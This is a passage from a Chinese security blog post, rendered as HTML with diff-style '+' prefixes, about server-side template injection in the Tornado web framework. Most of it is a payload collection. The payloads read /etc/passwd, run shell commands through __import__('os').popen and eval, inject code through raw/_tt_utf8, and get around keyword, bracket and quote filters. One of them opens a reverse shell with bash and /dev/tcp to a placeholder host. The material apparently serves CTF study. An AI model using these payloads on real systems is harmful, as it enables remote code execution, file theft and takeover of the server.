+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>decode_argument<span class="token punctuation">(</span><span class="token string">'\u0066'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>  <span class="token operator">//</span>返回f，其中\u0066为f的<span class="token builtin">unicode</span>编码
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>get_query_argument<span class="token punctuation">(</span><span class="token string">'yu'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>  <span class="token operator">//</span>比如传入?yu<span class="token operator">=</span><span class="token number">123</span>则返回值为<span class="token number">123</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>settings<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>  <span class="token operator">//</span>返回传入application<span class="token punctuation">.</span>settings中的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>&#123;&#123;handler.settings&#125;&#125;</code>获取的一般就是环境变量</p>
+<hr>
+<h3 id="绕过字符限制"><a href="#绕过字符限制" class="headerlink" title="绕过字符限制"></a>绕过字符限制</h3><p>经典参数逃逸：</p>
+<ol>
+<li><code>RequestHandler.request.*</code></li>
+<li>其他和 request 一样的方法：例如 <code>get_argument</code> 等等，就不一一列举了，可以参考官方文档</li>
+</ol>
+<hr>
+<h3 id="带出回显"><a href="#带出回显" class="headerlink" title="带出回显"></a>带出回显</h3><ul>
+<li>RequestHandler.set_cookie：设置 cookie</li>
+<li>RequestHandler.set_header：设置一个新的响应头</li>
+<li>RequestHandler.redirect：重定向，可以通过 location 获取回显</li>
+<li>RequestHandler.send_error：发送错误码和错误信息</li>
+<li>RequestHandler.write_error：同上，被 <code>send_error</code> 调用</li>
+</ul>
+<hr>
+<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>tornado中可以直接使用<code>globals()</code>函数，并且可以直接调用一些python的初始方法，比如__import__、eval、print、hex等</p>
+<p>于是我们的payload相比flask会简单不少</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("calc").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('calc').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>payload收集：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">无过滤：
+<span class="token number">1</span>、读文件
+<span class="token punctuation">&#123;</span><span class="token operator">%</span> extends <span class="token string">"/etc/passwd"</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token operator">%</span> include <span class="token string">"/etc/passwd"</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>
+
+<span class="token number">2</span>、 直接使用函数
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token number">3</span>、导入库
+<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">import</span> os <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token number">4</span>、flask中的payload大部分也通用
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+其中<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span>为<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'os._wrap_close'</span><span class="token operator">></span>类
+第二个中的x为有__builtins__的<span class="token keyword">class</span>
+
+<span class="token class-name">5</span>、利用tornado特有的对象或者方法
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>request<span class="token punctuation">.</span>server_connection<span class="token punctuation">.</span>_serving_future<span class="token punctuation">.</span>_coro<span class="token punctuation">.</span>cr_frame<span class="token punctuation">.</span>f_builtins<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token number">6</span>、利用tornado模板中的代码注入
+<span class="token punctuation">&#123;</span><span class="token operator">%</span> raw <span class="token string">"__import__('os').popen('ls').read()"</span><span class="token operator">%</span>0a    _tt_utf8 <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'1'</span><span class="token operator">%</span>0a    _tt_utf8 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+有过滤：
+
+<span class="token number">1.</span>过滤一些关键字如<span class="token keyword">import</span>、os、popen等（过滤引号该方法同样适用）
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span>handler<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span>request<span class="token punctuation">.</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+然后看下请求方法，如果是get的话就可以传?GET<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>，post同理
+<span class="token number">2.</span>过滤了括号未过滤引号
+<span class="token punctuation">&#123;</span><span class="token operator">%</span> raw <span class="token string">"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"</span><span class="token operator">%</span>0a    _tt_utf8 <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'1'</span><span class="token operator">%</span>0a    _tt_utf8 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token number">3.</span>过滤括号及引号
+下面这种方法无回显，适用于反弹shell，为什么用<span class="token keyword">exec</span>不用<span class="token builtin">eval</span>呢？
+是因为<span class="token builtin">eval</span>不支持多行语句。
+<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'bash -i >&amp; /dev/tcp/xxx/xxx 0>&amp;1'</span><span class="token punctuation">)</span><span class="token operator">%</span>0a<span class="token triple-quoted-string string">"""%0a&amp;data=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;%0a"""</span>
+<span class="token number">4.</span>其他
+通过参考其他师傅的文章学到了下面的方法（两个是一起使用的）
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>application<span class="token punctuation">.</span>default_router<span class="token punctuation">.</span>add_rules<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token string">"os.po"</span><span class="token operator">+</span><span class="token string">"pen"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"345"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler<span class="token punctuation">.</span>application<span class="token punctuation">.</span>default_router<span class="token punctuation">.</span>named_rules<span class="token punctuation">[</span><span class="token string">'345'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">(</span><span class="token string">'/readflag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
